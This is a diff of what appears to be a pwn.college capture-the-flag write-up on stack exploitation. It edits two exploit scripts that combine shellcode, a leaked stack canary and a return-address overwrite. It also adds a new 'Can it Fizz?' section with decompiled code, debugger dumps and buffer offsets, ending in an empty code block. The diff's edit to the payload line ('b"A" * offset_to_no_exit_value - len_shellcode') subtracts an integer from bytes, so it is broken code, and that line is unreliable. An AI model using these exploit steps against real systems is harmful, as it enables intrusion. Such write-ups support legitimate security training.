@@ -3819,8 +3819,6 @@ We can see that the flag is read at an offset of `0x5040` which falls in the `.b
 There is a `read@plt` happening at `challenge+347`.
 Let's put a breakpoint and run the program.
 
-347 411
-
 ```
 pwndbg> break *(challenge+347)
 Breakpoint 1 at 0x2053
@@ -12084,8 +12082,9 @@ no_exit_value = 0x7a63521e6deaa1b4
 offset_buffers_consec_challenge_frames = 128
 
 # --- STAGE 1: LEAK CANARY ---
-# Calculate offset_to_canary and payload_size
+# Calculate offset_to_canary, offset_to_no_exit_value and payload_size
 offset_to_canary = canary_addr - buffer_addr
+offset_to_no_exit_value = offset_to_canary - 8
 payload_size = offset_to_canary + 1
 
 # Send payload_size
@@ -12138,7 +12137,7 @@ p.sendline(str(payload_size).encode())
 
 # Craft payload
 payload = shellcode
-payload += b"A" * (offset_to_canary - (len_shellcode + 8))
+payload += b"A" * offset_to_no_exit_value - len_shellcode
 payload += p64(no_exit_value)
 payload += p64(canary)
 payload += b"B" * offset_to_ret
@@ -12803,8 +12802,9 @@ no_exit_value = 0x3AF9ACCA4293A671
 offset_buffers_diff_challenge_frames = nth_buffer_addr - n_plus_1th_buffer_addr        # 160 bytes
 
 # --- STAGE 1: LEAK CANARY ---
-# Calculate offset_to_canary and payload_size
+# Calculate offset_to_canary, offset_to_no_exit_value and payload_size
 offset_to_canary = canary_addr - buffer_addr
+offset_to_no_exit_value = offset_to_canary - 8
 payload_size = offset_to_canary + 1
 
 # Send payload_size
@@ -12890,7 +12890,7 @@ p.sendline(str(payload_size).encode())
 
 # Craft payload
 payload = shellcode
-payload += b"A" * (offset_to_canary - (len_shellcode + 8))
+payload += b"A" * offset_to_no_exit_value - len_shellcode
 payload += p64(no_exit_value)
 payload += p64(canary)
 payload += b"B" * 8
@@ -12919,4 +12919,212 @@ $
 ```
 hacker@program-security~a-crafty-clobber-hard:~$ cat ~/Z
 pwn.college{EQf_cMvGimapk5C6wtgB4JrjY1M.0lNyMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Can it Fizz?
+
+```
+hacker@program-security~can-it-fizz:~$ ls /challenge/
+can-it-fizz
+```
+
+```
+hacker@program-security~can-it-fizz:~$ file /challenge/can-it-fizz 
+/challenge/can-it-fizz: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=849dacb6013ddbe19eab460b771e982f199a36a2, for GNU/Linux 3.2.0, not stripped
+```
+
+```
+hacker@program-security~can-it-fizz:~$ checksec /challenge/can-it-fizz 
+[*] '/challenge/can-it-fizz'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Let's analyze the binary.
+
+### Binary Analysis
+
+```c title="/challenge/can-it-fizz" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  challenge((unsigned int)argc, argv, envp);
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+We see that `main()` calls `challenge()`.
+
+```c title="/challenge/can-it-fizz" showLineNumbers
+__int64 challenge()
+{
+  __int64 result; // rax
+  char *buffer[14]; // [rsp+20h] [rbp-70h] BYREF
+
+  memset(buffer, 0, 0x68uLL);
+  buffer[12] = (char *)buffer + 4;
+  buffer[11] = (char *)&buffer[2] + 4;
+  HIDWORD(buffer[10]) = 0;
+  LODWORD(buffer[0]) = 16;
+  strcpy((char *)&buffer[9] + 4, "Buzz\n");
+  puts("Welcome to Fizz Buzz!");
+  for ( HIDWORD(buffer[10]) = 0; ; ++HIDWORD(buffer[10]) )
+  {
+    result = LODWORD(buffer[0]);
+    if ( SHIDWORD(buffer[10]) >= SLODWORD(buffer[0]) )
+      break;
+    if ( SHIDWORD(buffer[10]) % 15 )
+    {
+      if ( SHIDWORD(buffer[10]) % 3 )
+      {
+        if ( SHIDWORD(buffer[10]) % 5 )
+          buffer[11] = (char *)&nothing;
+        else
+          buffer[11] = (char *)&buffer[9] + 4;
+      }
+      else
+      {
+        buffer[11] = fizz;
+      }
+    }
+    else
+    {
+      buffer[11] = (char *)&fuzzbuzz;
+    }
+    printf("%d: ", HIDWORD(buffer[10]));
+    read(0, (char *)&buffer[2] + 4, 0x100uLL);
+    printf("You entered: %s\n", (const char *)&buffer[2] + 4);
+    BYTE4(buffer[2]) = 0;
+    strcpy(buffer[12], buffer[11]);
+    printf("Correct answer: %s\n", buffer[12]);
+  }
+  return result;
+}
+```
+
+Let's open the program in GDB.
+
+```
+pwndbg> break *(challenge+366)
+Breakpoint 1 at 0x1357
+```
+
+```
+pwndbg> run
+Starting program: /challenge/can-it-fizz 
+###
+### Welcome to /challenge/can-it-fizz!
+###
+
+Welcome to Fizz Buzz!
+0: 
+Breakpoint 1, 0x00005fed7d55a357 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffded2c72f4 ◂— 0
+ RBX  0x5fed7d55a480 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  0x100
+ RDI  0
+ RSI  0x7ffded2c72f4 ◂— 0
+ R8   3
+ R9   3
+ R10  0x5fed7d55b01c ◂— 0x6520756f5900203a /* ': ' */
+ R11  0x246
+ R12  0x5fed7d55a100 (_start) ◂— endbr64 
+ R13  0x7ffded2c7470 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffded2c7350 —▸ 0x7ffded2c7380 ◂— 0
+ RSP  0x7ffded2c72c0 ◂— 0xd68 /* 'h\r' */
+ RIP  0x5fed7d55a357 (challenge+366) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5fed7d55a357 <challenge+366>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7ffded2c72f4 ◂— 0
+        nbytes: 0x100
+ 
+   0x5fed7d55a35c <challenge+371>    lea    rax, [rbp - 0x70]
+   0x5fed7d55a360 <challenge+375>    add    rax, 0x14
+   0x5fed7d55a364 <challenge+379>    mov    rsi, rax
+   0x5fed7d55a367 <challenge+382>    lea    rdi, [rip + 0xcb1]     RDI => 0x5fed7d55b01f ◂— 'You entered: %s\n'
+   0x5fed7d55a36e <challenge+389>    mov    eax, 0                 EAX => 0
+   0x5fed7d55a373 <challenge+394>    call   printf@plt                  <printf@plt>
+ 
+   0x5fed7d55a378 <challenge+399>    mov    byte ptr [rbp - 0x5c], 0
+   0x5fed7d55a37c <challenge+403>    mov    rdx, qword ptr [rbp - 0x18]
+   0x5fed7d55a380 <challenge+407>    mov    rax, qword ptr [rbp - 0x10]
+   0x5fed7d55a384 <challenge+411>    mov    rsi, rdx
+─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp         0x7ffded2c72c0 ◂— 0xd68 /* 'h\r' */
+01:0008│-088         0x7ffded2c72c8 —▸ 0x7ffded2c7488 —▸ 0x7ffded2c969b ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-080         0x7ffded2c72d0 —▸ 0x7ffded2c7478 —▸ 0x7ffded2c9684 ◂— '/challenge/can-it-fizz'
+03:0018│-078         0x7ffded2c72d8 ◂— 0x10000000a /* '\n' */
+04:0020│-070         0x7ffded2c72e0 ◂— 0x10
+05:0028│-068         0x7ffded2c72e8 ◂— 0
+06:0030│ rax-4 rsi-4 0x7ffded2c72f0 ◂— 0
+07:0038│-058         0x7ffded2c72f8 ◂— 0
+───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5fed7d55a357 challenge+366
+   1   0x5fed7d55a466 main+165
+   2   0x7d62ab78f083 __libc_start_main+243
+   3   0x5fed7d55a12e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7ffded2c72f4`
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffded2c7360:
+ rip = 0x5fed7d55a357 in challenge; saved rip = 0x5fed7d55a466
+ called by frame at 0x7ffded2c7390
+ Arglist at 0x7ffded2c7350, args: 
+ Locals at 0x7ffded2c7350, Previous frame's sp is 0x7ffded2c7360
+ Saved registers:
+  rbp at 0x7ffded2c7350, rip at 0x7ffded2c7358
+```
+
+```
+pwndbg> x/30gx $rsi-0x4
+0x7ffded2c72f0: 0x0000000000000000      0x0000000000000000
+0x7ffded2c7300: 0x0000000000000000      0x0000000000000000
+0x7ffded2c7310: 0x0000000000000000      0x0000000000000000
+0x7ffded2c7320: 0x0000000000000000      0x7a7a754200000000
+0x7ffded2c7330: 0x000000000000000a      0x00005fed7d55d018
+0x7ffded2c7340: 0x00007ffded2c72e4      0x00005fed7d55a100
+0x7ffded2c7350: 0x00007ffded2c7380      0x00005fed7d55a466
+0x7ffded2c7360: 0x0000000000000000      0x00007ffded2c7488
+0x7ffded2c7370: 0x00007ffded2c7478      0x0000000100000000
+0x7ffded2c7380: 0x0000000000000000      0x00007d62ab78f083
+0x7ffded2c7390: 0x00007d62ab99a620      0x00007ffded2c7478
+0x7ffded2c73a0: 0x0000000100000000      0x00005fed7d55a3c1
+0x7ffded2c73b0: 0x00005fed7d55a480      0x921bc82ab589ed38
+0x7ffded2c73c0: 0x00005fed7d55a100      0x00007ffded2c7470
+0x7ffded2c73d0: 0x0000000000000000      0x0000000000000000
+```
+
+- [x] Location of buffer: `0x7ffded2c72f4`
+- [x] Location of pointer to leak: `0x7ffded2c7340`
+- [x] Required number of bytes: `76`
+
+
+```py
+
 ```
